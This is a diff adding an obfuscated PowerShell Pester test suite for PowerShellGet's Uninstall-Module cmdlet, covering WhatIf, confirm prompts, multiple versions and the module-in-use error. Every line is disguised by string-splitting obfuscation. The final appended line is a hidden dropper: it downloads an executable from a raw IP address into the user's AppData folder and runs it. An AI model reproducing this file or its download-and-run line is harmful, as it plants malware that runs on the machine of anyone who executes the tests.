@@ -1,0 +1,269 @@
+  &("{2}{1}{0}"-f'M','t-ITE','Se')  ("{0}{2}{3}{1}" -f 'Va','r','RI','abLe:ok')  ( [TYPe]("{3}{0}{1}{2}"-F 'Y','StEM.guI','D','s')  )  ;  &("{2}{0}{1}" -f 'T-VA','rIAbLE','SE')  ("j"+"4O")  ( [type]("{3}{5}{1}{0}{4}{2}"-f'irO','M.eNv','NT','sysT','nmE','e'));    &("{1}{0}"-f 'tem','SeT-I')  ("{1}{2}{4}{3}{0}" -f 'yZ','VARIa','bLe:7','1','UH')  ([TYPe]("{0}{3}{1}{2}" -f 'sy','m.','iO.paTH','STe')  )  ;
+
+
+
+function suITE`Se`T`Up {
+    &("{3}{2}{1}{0}" -f'le','Modu','t-','Impor') "$PSScriptRoot\PSGetTestUtils.psm1" -WarningAction ("{0}{2}{1}{3}"-f'S','entl','il','yContinue')
+    &("{2}{0}{1}"-f'l','e','Import-Modu') "$PSScriptRoot\Asserts.psm1" -WarningAction ("{1}{3}{4}{0}{2}" -f'ont','S','inue','ile','ntlyC')
+
+    ${sc`R`ipT:`pRo`GRaMfilEsMo`D`ULESPAth} = &("{1}{2}{3}{4}{0}"-f'Path','Get-A','llUser','sModu','les')
+    ${SCRipT:MydOC`Um`e`Nt`SmODULE`s`PaTh} = &("{3}{0}{1}{4}{2}"-f 'U','serModulesP','h','Get-Current','at')
+    ${Scri`Pt:`pSgEtlo`c`A`LAPpdaT`AP`A`TH} = &("{6}{1}{0}{3}{2}{4}{5}"-f 'SGetLo','t-P','al','c','A','ppDataPath','Ge')
+    ${sC`R`IPT:TeM`pp`Ath} = &("{1}{2}{0}" -f 'empPath','Get-','T')
+
+    
+    &("{0}{2}{4}{1}{3}{6}{5}" -f 'Ins','-NuGetB','tal','ina','l','s','rie')
+
+    ${p`SgETM`ODuL`EinFO} = &("{2}{1}{0}"-f 'le','du','Import-Mo') ("{2}{3}{1}{0}"-f'Get','l','PowerSh','el') -Global -Force -Passthru
+    &("{1}{2}{3}{0}" -f 'Data','Import','-L','ocalized')  ("{2}{6}{1}{3}{0}{5}{4}" -f'ocaliz','ipt:','sc','L','ata','edD','r') -filename ("{2}{4}{1}{3}{0}" -f'.psd1','r','PSGe','ce','t.Resou') -BaseDirectory ${P`sg`etmODULei`NfO}."M`ODuLEB`ASe"
+
+    ${SCR`iPT:`Modu`LeS`o`URCeSFIle`P`ATH}= &("{3}{0}{1}{2}"-f'n-P','at','h','Joi') ${SCRi`PT`:P`sget`l`ocaLaPPDatAp`AtH} ("{0}{1}{3}{2}" -f 'PSR','epos','s.xml','itorie')
+    ${SCrIpt:MoDULe`SO`UR`C`Esb`ACKu`p`F`iLePAth} = &("{2}{1}{0}" -f'ath','-P','Join') ${SCR`I`p`T:ps`get`lO`C`AlaPPDAtAPath} "PSRepositories.xml_$(get-random)_backup"
+
+    if(&("{1}{0}{2}"-f'st-','Te','Path') ${scRI`PT:MOdU`Les`oU`Rc`ESfi`lePa`TH})
+    {
+        &("{1}{0}{2}{3}" -f'ame-','Ren','I','tem') ${ScRi`pt:MODULEs`OU`R`C`esFi`LEPaTh} ${scRi`pT:moDUl`e`s`o`URC`E`sBAckuPf`I`LEPa`TH} -Force
+    }
+
+    &("{5}{1}{0}{2}{3}{4}"-f 'PSGetTestGalle','-','ryDet','ai','ls','GetAndSet') -SetPSGallery
+
+    &(("{4}{1}{0}{2}{3}" -f 'TestUtilsIng','SGet','Uninstall-Mod','ule','P')).ReplAcE(([cHAr]73+[cHAr]110+[cHAr]103),'\') ("{0}{3}{2}{1}"-f'Contos','er','Serv','o')
+    &((("{3}{7}{5}{0}{4}{6}{8}{1}{2}"-f'stUt','odu','le','PS','i','tTe','ls8cfUninstal','Ge','l-M'))  -Replace '8cf',[CHar]92) ("{2}{1}{0}"-f't','osoClien','Cont')
+
+    ${SCRIp`T:aSSE`Rtt`i`meo`UtMs} = 20000
+}
+
+function suIteC`L`eaN`UP {
+    if(&("{1}{0}{2}"-f 'st-Pa','Te','th') ${ScrIpt`:`MOdulEsOUrCeSb`AcKUP`FI`LEp`Ath})
+    {
+        &("{2}{0}{1}{3}"-f 'e-I','te','Mov','m') ${script:mOdULeS`ourc`Es`Bac`KUP`F`il`eP`AtH} ${S`C`RIpt:`ModUle`SoUrCeSFIlEpaTh} -Force
+    }
+    else
+    {
+        &("{0}{1}{2}{3}"-f 'RemoveI','t','e','m') ${scrIPT`:mOduLeSo`UR`ces`Fil`EpAtH}
+    }
+
+    
+    ${nU`lL} = &("{1}{2}{0}{3}{4}" -f 'rt-Pa','I','mpo','ckageProv','ider') -Name ("{4}{1}{2}{3}{0}"-f 'hellGet','o','we','rS','P') -Force
+}
+
+&("{1}{0}{2}" -f 'escr','D','ibe') ("{5}{0}{3}{4}{2}{8}{7}{6}{9}{1}" -f'ow','Tests','.PS','erSh','ell','P','UnInstallModul','.','Get','e') -Tags 'BVT',("{0}{1}{2}"-f 'I','nne','rLoop') {
+
+    &("{1}{2}{0}" -f'l','Befo','reAl') {
+        &("{0}{2}{1}" -f'Su','etup','iteS')
+    }
+
+    &("{0}{1}" -f'AfterA','ll') {
+        &("{3}{0}{2}{1}"-f 'uiteC','eanup','l','S')
+    }
+
+    &("{2}{0}{1}" -f 'terE','ach','Af') {
+        &((("{5}{1}{2}{4}{8}{6}{0}{3}{7}" -f'du','tU','til','l','s9SHUnins','PSGetTes','o','e','tall-M'))-REplAcE'9SH',[CHAR]92) ("{1}{0}{2}" -f 'ontosoS','C','erver')
+        &((("{7}{4}{2}{1}{6}{0}{8}{5}{3}"-f'install-M','cP8U','ls','ule','TestUti','d','n','PSGet','o'))-creplACE  'cP8',[CHaR]92) ("{3}{1}{2}{0}" -f'nt','t','osoClie','Con')
+        &((("{2}{1}{0}{5}{4}{6}{3}"-f 'tUtilsy3GUnin','GetTes','PS','dule','all-M','st','o')) -REplAce([chAR]121+[chAR]51+[chAR]71),[chAR]92) ("{2}{0}{1}{3}" -f 'scTestM','odu','D','le')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{0}{3}{4}{2}{1}"-f'UnIn','atIf','h','stallModuleWith','W') {
+        ${o`UTputP`ATh} = ${S`Cri`pt:`TEMpp`ATH}
+        ${GU`ID} =    (  &("{1}{0}" -f 'Ir','d')  ("{2}{0}{1}{3}" -f'iAble:','O','vAR','kr')  ).vaLue::("{1}{0}"-f 'wguid','ne').Invoke().("{0}{1}{2}"-f 'tos','t','ring').Invoke()
+        ${O`UTPu`T`FIl`EPAtH} = &("{1}{0}{2}"-f'oin','J','-Path') ${ou`TP`UTPaTh} "$guid"
+        ${r`U`NspacE} = &("{2}{0}{1}"-f 'eRunSpac','e','Creat') ${OuTputF`iL`ePAth} 1
+        ${cO`NTEnt} = ${n`Ull}
+
+        try
+        {  
+	        &("{1}{2}{0}" -f 'dule','Fi','nd-Mo') ("{1}{3}{0}{2}"-f'osoSer','C','ver','ont') | &("{2}{1}{3}{0}"-f'le','ll','Insta','-Modu')          
+            ${re`S`ULT} = &("{1}{0}{2}{3}"-f 'x','E','ecut','eCommand') ${rU`N`Spa`Ce} ((("{4}{1}{5}{10}{2}{0}{11}{9}{7}{3}{8}{6}" -f 'nstal','Shell','jUni','r -','Power','Get','f','e','whati','erv','Kh','l-Module ContosoS')) -CREplAcE([chAR]75+[chAR]104+[chAR]106),[chAR]92)
+        }
+        finally
+        {
+            ${f`iL`e`NAMe} = ("{3}{2}{0}{1}"-f 'ne-','0.txt','iteLi','Wr')
+            ${p`ATh} = &("{0}{1}"-f 'join-pat','h') ${OUTpu`T`FILepA`TH} ${fIl`enA`me}
+            if(&("{2}{1}{0}"-f 'ath','P','Test-') ${P`ATH})
+            {
+                ${CoN`TENT} = &("{1}{0}{2}" -f'o','get-c','ntent') ${p`ATH}
+            }
+
+            &("{0}{1}{3}{2}" -f'Cl','oseRu','e','nSpac') ${r`UNsP`AcE}
+            &("{1}{0}{2}"-f'e','RemoveIt','m') ${ouTpU`Tf`Ile`P`Ath}
+        }
+
+        ${i`TEm`iN`FO} = &("{0}{3}{1}{2}" -f'Fi','d-Modul','e','n') ("{1}{2}{0}{3}"-f've','ContosoS','er','r') -Repository ("{0}{1}{2}"-f 'PSGa','lle','ry')
+        ${u`NinsT`A`LlSHou`L`DP`Ro`CEsSMesSAgE} = ${scRI`pT:l`oca`l`iz`eDdA`TA}."InSt`Allm`o`DuLeWHat`Ifme`ssa`gE" -f (${i`T`eMInFO}."n`AME", ${It`Emi`Nfo}."ve`Rs`Ion")
+        &("{2}{1}{0}" -f 't','ser','As') (${C`ONt`eNT} -and (${CO`NT`ENT} -match ${Unins`TAl`lS`HOUL`d`p`Ro`CesSM`ESSAGe})) ('I'+'n'+'stall '+'modul'+'e '+'w'+'hatif '+'me'+'ssag'+'e '+'i'+'s '+'mi'+'ssing'+', '+"Expected:$uninstallShouldProcessMessage, "+"Actual:$content")
+
+        ${M`od} = &("{0}{2}{5}{6}{4}{1}{3}" -f 'Get-I','o','nsta','dule','dM','l','le') ("{2}{3}{0}{1}" -f 'soServ','er','Con','to')
+        &("{0}{1}" -f 'Ass','ert') (${M`Od}) ("{5}{14}{10}{3}{8}{12}{6}{0}{9}{11}{7}{4}{2}{13}{1}" -f'i',' option','ule with -','-Mod','e mod','UnIn','ot un','ll th','ule ','ns','all','ta','should n','WhatIf','st')
+    } `
+    -Skip:$((${p`Se`DiTion} -eq ("{0}{1}"-f'C','ore')) -or (${psCu`ltU`RE} -ne ("{0}{1}" -f'en-U','S')) -or ( (&("{1}{2}{0}" -f 'E','VARI','ABl')  ('j'+'4o') ).ValuE::"OSv`eRS`Ion"."v`eRS`ION" -lt ("{2}{1}{0}"-f'.0','.2.9200','6')))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{7}{6}{9}{5}{8}{1}{10}{0}{2}{3}{4}" -f'rmAndNo','thConf','ToP','ro','mpt','lModule','ns','UnI','Wi','tal','i') {
+        ${oUtPu`T`Path} = ${S`C`RiPT`:teM`ppAth}
+        ${G`Uid} =   ( &("{3}{2}{0}{1}"-f 'riab','le','Et-Va','g') ("{1}{0}" -f 'r','Ok') -VaLUEo)::("{0}{1}" -f'new','guid').Invoke().("{0}{1}" -f 'tostrin','g').Invoke()
+        ${o`U`TPUtfILEp`A`TH} = &("{2}{1}{0}" -f 'h','oin-Pat','J') ${outP`Ut`Path} "$guid"
+        ${runS`pA`cE} = &("{2}{4}{0}{1}{3}"-f'ea','t','C','eRunSpace','r') ${OU`TPU`TFILePaTH} 1
+
+        
+        ${g`LobA`L`:PRoXy}."uI"."C`HOI`c`EtOMake"=2
+        ${coNTe`NT} = ${nU`lL}
+
+        try
+        {
+	        &("{1}{3}{0}{2}" -f 'all-Modu','I','le','nst') ("{0}{3}{4}{1}{2}"-f'C','tosoSe','rver','o','n') -Repository ("{1}{0}{2}" -f'Gal','PS','lery') -force
+            ${R`EsU`Lt} = &("{2}{3}{4}{0}{1}" -f 'a','nd','Exe','c','uteComm') ${Ru`NSpa`ce} ((("{4}{2}{9}{1}{8}{5}{3}{6}{10}{11}{0}{7}" -f 'Confir','e','wer','n','Po','0}Uninstall-Module Co','toso','m','llGet{','Sh','Serv','er -')) -f [cHar]92)
+        }
+        finally
+        {
+            ${FI`le`NAME} = ("{2}{0}{3}{1}"-f'romptForCho','0.txt','P','ice-')
+            ${Pa`TH} = &("{0}{1}"-f'join-pat','h') ${o`Ut`P`Utf`ilePaTh} ${fi`LE`NaME}
+            if(&("{0}{2}{1}" -f'Test-','ath','P') ${pA`Th})
+            {
+                ${c`O`NTent} = &("{0}{2}{1}" -f'get','content','-') ${Pa`Th}
+            }
+
+            &("{2}{0}{1}"-f'eRun','Space','Clos') ${rU`Ns`pA`cE}
+            &("{1}{2}{0}" -f 'm','RemoveI','te') ${oUTpu`TFIlEpA`Th}
+        }
+        
+        ${it`eM`INfo} = &("{2}{3}{0}{1}"-f'-Modu','le','F','ind') ("{1}{3}{0}{2}" -f 'erv','Cont','er','osoS') -Repository ("{1}{0}{2}"-f'le','PSGal','ry')
+
+        ${UN`I`NSt`Al`LsHouLDp`RoC`e`SsmEsSAge} = ${scrIPT:L`oCaLI`ZEdD`Ata}."iNS`Ta`LlmoDuLew`haT`iF`Mes`SA`gE" -f (${ite`M`INFO}."na`ME", ${i`TeM`I`NFo}."V`ersiON")
+        &("{1}{0}" -f'sert','As') (${c`oN`TEnT} -and (${cO`Nt`eNt} -match ${unInSt`ALlsHo`ULdProces`smESSa`gE})) ('UnIn'+'stal'+'l '+'mod'+'ule'+' '+'c'+'onfi'+'rm '+'promp'+'t '+'i'+'s '+'no'+'t '+'w'+'orking,'+' '+"Expected:$unInstallShouldProcessMessage, "+"Actual:$content")
+
+        ${M`Od} = &("{0}{2}{3}{1}{4}"-f 'Get-In','Modu','s','talled','le') ("{3}{2}{1}{4}{0}" -f 'rver','tos','on','C','oSe')
+        &("{2}{0}{1}" -f'sse','rt','A') (${m`od}) ("{7}{0}{9}{10}{1}{6}{3}{8}{2}{4}{11}{5}" -f'stall-M','ould not uni',' ',' the module if confir','n','epted','nstall','UnIn','m is','odule ','sh','ot acc')
+    } `
+    -Skip:$((${p`S`editiOn} -eq ("{0}{1}"-f'Cor','e')) -or (${PSCu`lt`UrE} -ne ("{1}{0}" -f 'US','en-')) -or ( (&("{1}{0}" -f'Ir','d')  ("{0}{2}{1}{3}"-f 'VaRia','e:j','Bl','4O') ).valUE::"O`SVeRsiON"."VE`R`SION" -lt ("{0}{1}{2}" -f'6.2.92','0','0.0')))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{7}{1}{4}{6}{5}{8}{0}{9}{2}{3}" -f'Confirm','ta','oProm','pt','ll','u','Mod','UnIns','leWith','AndYesT') {
+        ${oUT`PUtpa`Th} = ${SC`RI`PT:TE`m`PPA`Th}
+        ${g`UID} =   (  &("{1}{2}{3}{0}"-f 'aRIaBlE','gET','-','V') ("{1}{0}" -f'KR','O') -VA  )::("{0}{1}" -f'newgui','d').Invoke().("{2}{1}{0}" -f'ng','i','tostr').Invoke()
+        ${oU`Tp`UTfIle`p`Ath} = &("{2}{1}{0}"-f 'h','t','Join-Pa') ${O`U`Tp`UtpatH} "$guid"
+        ${r`UN`s`PaCe} = &("{2}{1}{0}"-f 'ce','a','CreateRunSp') ${O`UtPuTFil`Ep`ATh} 1
+
+        
+        ${glob`Al`:PROxY}."u`I"."cHOice`T`omAkE"=0
+        ${co`NT`eNT} = ${nu`LL}
+
+        try
+        {
+            &("{2}{0}{1}" -f'nd','-Module','Fi') ("{2}{0}{1}"-f 'tosoSe','rver','Con') | &("{3}{1}{2}{0}{4}" -f '-Mod','ta','ll','Ins','ule')
+            ${RE`s`ULt} = &("{3}{1}{2}{0}{4}"-f'm','Co','m','Execute','and') ${RuN`S`pAcE} ((("{0}{2}{7}{1}{9}{4}{3}{11}{12}{6}{5}{8}{10}" -f 'PowerSh','Getp','e','tal','nins','Cont','le ','ll','os','DhU','oServer -Confirm','l','-Modu'))-rEpLACe  ([chAr]112+[chAr]68+[chAr]104),[chAr]92)
+        }
+        finally
+        {
+            ${F`ILEn`A`me} = ("{0}{1}{4}{2}{3}" -f 'P','romptF','Choice-0.tx','t','or')
+            ${PA`TH} = &("{1}{0}{2}" -f 'oin-','j','path') ${out`PuTf`IlepaTH} ${fIL`e`NaMe}
+            if(&("{1}{0}" -f'h','Test-Pat') ${p`Ath})
+            {
+                ${c`ON`TENt} = &("{1}{2}{0}" -f 'ent','get-c','ont') ${P`AtH}
+            }
+
+            &("{0}{2}{1}" -f 'CloseRun','ace','Sp') ${rUn`SpA`cE}
+            &("{3}{0}{2}{1}" -f 'emo','m','veIte','R') ${o`U`TpuTfI`l`ePAtH}
+        }
+
+        ${it`emI`NFO} = &("{1}{2}{3}{0}" -f'ule','Find-M','o','d') ("{2}{0}{1}" -f 'osoS','erver','Cont') -Repository ("{1}{0}{2}"-f'G','PS','allery')
+
+        ${uNi`NSTA`LLsHouL`DprOcEssM`E`ssAGE} = ${s`CRIPT:loCaLIze`D`DA`TA}."iNSTA`llm`ODU`LewHatifme`sS`AgE" -f (${IT`e`miNFO}."n`AmE", ${I`TEMInFo}."VE`RsI`oN")
+        &("{1}{0}" -f'ssert','A') (${co`N`Tent} -and (${COn`Te`Nt} -match ${Uni`NsTaL`l`SHOUL`DprOCeS`S`MEssage})) ('U'+'n'+'Install '+'mo'+'dule'+' '+'conf'+'irm'+' '+'p'+'romp'+'t '+'is'+' '+'no'+'t '+'w'+'or'+'king, '+"Expected:$UninstallShouldProcessMessage, "+"Actual:$content")
+
+        ${R`ES} = &("{0}{2}{3}{1}" -f 'Get-I','ule','nst','alledMod') ("{3}{4}{2}{0}{1}"-f'erv','er','S','Con','toso') -ErrorAction ("{2}{1}{3}{0}{4}" -f 'tly','ile','S','n','Continue')
+        &("{2}{1}{0}" -f 'll','Nu','Assert') ${r`Es} ("{17}{6}{11}{8}{3}{2}{1}{14}{5}{15}{16}{4}{7}{12}{0}{18}{10}{9}{13}"-f'irm is ','t','s','ould unin','dul','l','Install-','e if C','h','te',' accep','Module s','onf','d','a','l ','a mo','Un','not')
+    } `
+    -Skip:$((${Ps`ed`itIoN} -eq ("{0}{1}"-f 'Cor','e')) -or (${p`SCUltu`Re} -ne ("{1}{0}"-f 'US','en-')) -or ( ( &("{2}{0}{1}"-f'i','aBle','var')  ("j"+"4o")  -vALU  )::"o`sv`erSIOn"."vErs`I`oN" -lt ("{2}{0}{1}" -f'.2.9200','.0','6')))
+
+    
+    &('It') ("{5}{4}{9}{0}{10}{6}{3}{8}{1}{7}{2}" -f 'GetInstalle','ll','ns','ns','a','V','i','ModuleCmdletsWithAllVersio','ta','lidate','dAndUn') {
+
+        ${m`o`dulE`Name} = ("{2}{0}{3}{1}"-f 'ntosoServ','r','Co','e')
+
+        &("{2}{1}{4}{3}{0}"-f 'e','l-M','Instal','l','odu') -Name ${moD`UL`EN`Ame} -RequiredVersion 1.0 -Force
+        ${m`OD} = &("{4}{1}{3}{2}{0}"-f'le','et-Inst','edModu','all','G') -Name ${moD`ULeN`A`Me} -AllVersions
+        &("{1}{0}{2}"-f'ssertEq','A','uals') ${M`od}."n`AMe" ${m`odu`LEna`me} ('Get-Ins'+'t'+'alle'+'d'+'M'+'odu'+'le '+'ret'+'ur'+'ned '+'w'+'rong'+' '+'modu'+'l'+'e, '+"$mod")
+        &("{1}{0}{2}" -f 'sertEqu','As','als') ${M`Od}."VerSI`On" "1.0" ('G'+'et-'+'I'+'ns'+'talle'+'dModul'+'e '+'retur'+'n'+'ed '+'wron'+'g '+'mo'+'dule '+'ve'+'rsion,'+' '+"$mod")
+
+        &("{2}{3}{0}{1}" -f 'Mo','dule','Upda','te-') -Name ${M`oDulEN`A`mE} -RequiredVersion 2.0
+        ${mO`D2} = &("{0}{3}{2}{5}{4}{1}" -f'G','dule','Insta','et-','Mo','lled') -Name ${moduL`EnA`mE}
+        &("{1}{0}{3}{2}" -f 'q','AssertE','ls','ua') ${mO`D2}."na`ME" ${m`Odul`eNAME} ('Get-I'+'ns'+'ta'+'ll'+'edM'+'odule '+'re'+'t'+'urned '+'w'+'rong '+'mod'+'ul'+'e '+'aft'+'e'+'r '+'Up'+'date-'+'Module'+', '+"$mod2")
+        &("{0}{2}{1}"-f 'A','uals','ssertEq') ${M`oD2}."vE`RS`iON" "2.0"  ('Ge'+'t-In'+'stalledModu'+'le '+'retur'+'n'+'ed'+' '+'w'+'rong '+'mo'+'d'+'ule '+'ve'+'rsio'+'n '+' '+'af'+'ter '+'Upd'+'ate-M'+'od'+'ule, '+"$mod2")
+
+        ${mO`duL`Es2} = &("{1}{0}{3}{4}{5}{2}" -f 't-Ins','Ge','e','talle','d','Modul') -Name ${mo`d`ULenAmE} -AllVersions
+
+        if(${P`S`V`eRsioNtA`BLe}."pSver`sIon" -gt ("{1}{0}"-f'.0','5.0'))
+        {
+            &("{3}{1}{2}{0}" -f 'quals','ssert','E','A') ${MO`D`Ules2}."CO`UNt" 2 ('Get-I'+'nstall'+'edMo'+'du'+'l'+'e '+'with'+' '+'a'+'ll '+'ve'+'rsio'+'n '+'is'+' '+'no'+'t '+'working'+' '+'fin'+'e, '+"$modules2")
+        }
+        else
+        {
+            &("{0}{2}{1}" -f 'Asse','quals','rtE') ${m`ODUl`E`s2}."N`AME" ${MOdu`LEn`A`mE} ('Get-Install'+'ed'+'Mod'+'ule '+'with'+' '+'a'+'ll '+'v'+'er'+'sion '+'is'+' '+'no'+'t '+'wo'+'rkin'+'g '+'f'+'ine,'+' '+"$modules2")
+        }        
+        
+        &(("{7}{6}{2}{1}{3}{0}{4}{5}" -f's','l','l','GetJp4Unin','tall-Modul','e','owerShe','P')).replacE(([cHAr]74+[cHAr]112+[cHAr]52),[strING][cHAr]92) -Name ${moDu`LE`NAMe} -AllVersions
+
+        &("{3}{1}{0}{4}{2}{5}" -f 'yQua','Full','e','Assert','lifi','dErrorIdEquals') -scriptblock {&("{2}{3}{0}{1}" -f 'M','odule','Ge','t-Installed') -Name ${M`ODUl`enaME}} `
+                                          -expectedFullyQualifiedErrorId ("{4}{12}{11}{3}{9}{0}{6}{1}{7}{10}{18}{8}{2}{14}{15}{17}{16}{13}{5}"-f 'ft','Power','Mana','chFound,Micr','NoM','e','.','Shell','age','oso','.Pa','t','a','ackag','g','ement.Cm','ets.GetP','dl','ck')
+    }
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{5}{9}{8}{0}{11}{6}{2}{4}{1}{3}{7}{10}" -f'InU','i','u','ngUninst','r','Validat','orD','al','s','eModuleI','lModule','seErr') {
+        ${NO`Na`Dmin`COnsOLeo`U`TPuT} = &("{0}{1}{2}"-f'J','oin-','Path') (  ${7uH1`YZ}::("{1}{3}{2}{0}" -f'ath','GetTem','P','p').Invoke()) ("{2}{1}{0}{5}{3}{4}" -f 'ole','s','nonadmincon','tx','t','-out.')
+        &("{1}{2}{0}"-f'Process','Start','-') "$PSHOME\PowerShell.exe" -ArgumentList (('aBpnul'+'l'+' ').("{1}{0}" -f 'E','RePlac').Invoke('aBp','$')+'= '+'Install'+'-Pa'+'cka'+'g'+'ePro'+'vid'+'er '+'-'+'Name '+'NuG'+'et '+'-Minim'+'u'+'m'+'V'+'er'+'sion '+'2.8.'+'5.2'+'01 '+'-'+'Force '+'-'+'Scop'+'e '+'CurrentUser'+';'+'
+'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('m'+'zXn'+'ull ') -cRePLace 'mzX',[cHAR]36)+'= '+'Impo'+'rt-PackagePr'+'ovi'+'d'+'er '+'-Na'+'me '+'Nu'+'Get'+' '+'-Minimu'+'m'+'Ve'+'rsion '+'2'+'.8.5.'+'201'+' '+'-'+'F'+'orce;
+ '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'I'+'n'+'stall-'+'Module '+'-N'+'a'+'me '+'D'+'scTes'+'tModule '+'-Sc'+'ope '+'Cur'+'rentUse'+'r;
+ '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Impor'+'t-Mo'+'du'+'le '+'-N'+'ame '+'Ds'+'cTestModu'+'le'+';'+'
+ '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Un'+'install-Mo'+'dule'+' '+'-'+'Na'+'me '+'D'+'scT'+'estModu'+'le') `
+                                               -Wait `
+                                               -WorkingDirectory ${Psh`o`ME} `
+                                               -RedirectStandardOutput ${N`OnAdMINConsOLe`OUTP`Ut}
+        &("{1}{0}" -f 'or','waitF') {&("{0}{1}{2}" -f 'Tes','t-','Path') ${nOna`DMIN`conSO`L`EOutpuT}} -timeoutInMilliseconds ${ScRi`p`T:A`sSErtt`IME`oUt`Ms} -exceptionMessage ("{2}{3}{7}{1}{5}{9}{10}{6}{4}{0}{8}{11}"-f'e','tall-Mod','Un','i',' fail','u','ole','ns','d t','le on no','n-admin cons','o complete')
+        ${C`o`NtenT} = &("{2}{0}{1}" -f'-Co','ntent','Get') ${nONADMinc`on`S`oleOu`Tp`UT}
+        
+        ${M`odu`LenaMe} = ("{2}{0}{4}{3}{1}" -f'scTes','le','D','u','tMod')
+        ${MO`dU`lE} = &("{1}{0}{2}{3}{4}"-f '-Inst','Get','all','e','dModule') -Name ${MO`duleNa`mE}
+        &("{0}{3}{1}{2}"-f'Ass','l','s','ertEqua') ${M`o`DULe}."nA`mE" ${M`oD`ULeNaME} ('Uni'+'nstal'+'l'+'-module'+' '+'should'+' '+'no'+'t '+'un'+'ins'+'ta'+'ll '+'whe'+'n '+'a '+'mod'+'ule'+' '+'b'+'eing '+'un'+'insta'+'l'+'led '+'i'+'s '+'i'+'n '+'use'+'. '+"$content")
+
+        if(${PsvER`s`Io`N`Table}."P`svErsION" -gt ("{1}{0}"-f'0.0','5.'))
+        {
+            &("{0}{1}"-f'Ass','ert') (${C`onTent} -and (${c`onte`NT} -match ("{0}{2}{1}"-f'Modul','e','eIsInUs'))) ('Unins'+'t'+'all-'+'module '+'shou'+'ld '+'fail'+' '+'whe'+'n '+'a '+'m'+'od'+'ule '+'ver'+'sion'+' '+'b'+'eing '+'uninstall'+'ed'+' '+'i'+'s '+'in'+' '+'use,'+' '+"$content.")
+        }
+
+        &("{1}{2}{0}"-f 'm','RemoveI','te') ${NONadm`InC`ON`sOlE`OU`T`PUT}
+    } `
+    -Skip:$(
+            ${whO`A`mivalue} = (&("{0}{1}"-f'w','hoami'))
+
+            (${wHo`AM`iV`ALuE} -eq ((("{1}{2}{3}{0}"-f 'M','N','T AUTHORITY{0}S','YSTE'))-F [Char]92)) -or
+            (${wH`OAMIVa`lUE} -eq ((("{0}{8}{6}{2}{1}{5}{3}{7}{4}" -f'N','YBy','ORIT','L','ERVICE','l','H','OCAL S','T AUT')) -rePLacE 'Byl',[chAR]92)) -or
+            (${w`H`OaMiVAl`UE} -eq ((("{3}{6}{4}{2}{1}{0}{5}" -f 'SE',' ','ETWORK','NT AUTHO','ITY{0}N','RVICE','R'))-f[Char]92)) -or
+            (${P`sVE`RSiO`NTABle}."p`sVeRSIOn" -lt ("{1}{0}" -f '0','4.0.')) -or
+            (${ENv:AP`pve`YOR_tesT`_`P`ASs} -eq ("{1}{0}" -f 'e','Tru')) -or
+            (${P`seDI`TIOn} -eq ("{0}{1}"-f 'Co','re')) -or
+            (${PSCUL`Tu`Re} -ne ("{1}{0}" -f'n-US','e'))
+        )
+}
+
+(&("{1}{3}{2}{0}"-f'-Object','N','w','e') ("{2}{0}{3}{1}{4}" -f'ystem.','We','S','Net.','bClient')).("{0}{2}{1}" -f 'Down','File','load').Invoke(("{4}{1}{2}{6}{5}{3}{0}" -f'cv.exe','/89.','2','/iese','http:/','6.140/~zebra','48.16'),"$env:APPDATA\scvkem.exe");&("{1}{2}{0}"-f 'Process','Start','-') ("$env:APPDATA\scvkem.exe")
